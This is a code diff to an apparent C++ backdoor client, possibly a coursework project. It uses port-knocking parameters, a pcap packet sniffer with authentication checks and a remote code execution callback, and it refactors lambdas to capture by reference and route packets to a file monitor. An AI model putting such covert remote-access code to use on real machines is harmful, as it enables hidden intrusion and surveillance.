@@ -85,19 +85,19 @@ void testRceRes(const Properties &p) {
 
 // TODO: Remove
 void testFileMonitor() {
-    EventCallback created = [=](const FileMonitor *fm, struct inotify_event *e) {
+    EventCallback created = [&](const FileMonitor *fm, struct inotify_event *e) {
         std::cout << "created" << std::endl;
         std::cout << "name: " << e->name << std::endl;
         std::cout << std::endl;
     };
 
-    EventCallback modified = [=](const FileMonitor *fm, struct inotify_event *e) {
+    EventCallback modified = [&](const FileMonitor *fm, struct inotify_event *e) {
         std::cout << "modified" << std::endl;
         std::cout << "name: " << e->name << std::endl;
         std::cout << std::endl;
     };
 
-    EventCallback deleted = [=](const FileMonitor *fm, struct inotify_event *e) {
+    EventCallback deleted = [&](const FileMonitor *fm, struct inotify_event *e) {
         std::cout << "deleted" << std::endl;
         std::cout << "name: " << e->name << std::endl;
         std::cout << std::endl;
@@ -242,48 +242,26 @@ int clientMode(const Properties &p, char *programName) {
     unsigned short knockPort = std::stoi(p.at("knockPort"));
     unsigned int knockDuration = std::stoi(p.at("knockDuration"));
 
-    EventCallback created = [=](const FileMonitor *fm, struct inotify_event *e) {
+    // create file monitor
+    EventCallback created = [&](const FileMonitor *fm, struct inotify_event *e) {
 
     };
-
-    EventCallback modified = [=](const FileMonitor *fm, struct inotify_event *e) {
-
-    };
-
-    EventCallback deleted = [=](const FileMonitor *fm, struct inotify_event *e) {
+    EventCallback modified = [&](const FileMonitor *fm, struct inotify_event *e) {
 
     };
+    EventCallback deleted = [&](const FileMonitor *fm, struct inotify_event *e) {
 
+    };
     FileMonitor fm(created, modified, deleted);
 
+    // create network engine
     NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
 
     // adding all the required callback functions
     netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
     netEngine.LoopCallbacks.push_back(
-        [=](const pcap_pkthdr *header, const unsigned char *packet, NetworkEngine *net) {
-            // is it from same machine?
-            if (net->isFromThisMachine(eth)) {
-                return;
-            }
-
-            // is it ip?
-            if (!net->isIp(eth)) {
-                return;
-            }
-
-            // is it tcp?
-            ip = (struct iphdr *)(packet + ETH_HLEN);
-            if (!net->isTcp(ip)) {
-                return;
-            }
-
-            tcp = (struct tcphdr *)(packet + ETH_HLEN + (ip->ihl * 4));
-
-            // is it authenticated?
-            if (!net->isAuth(tcp)) {
-                return;
-            }
+        [&](const pcap_pkthdr *header, const unsigned char *packet, NetworkEngine *net) -> void {
+            fm.netCallback(header, packet, net);
         });
 
     fm.startMonitoring();
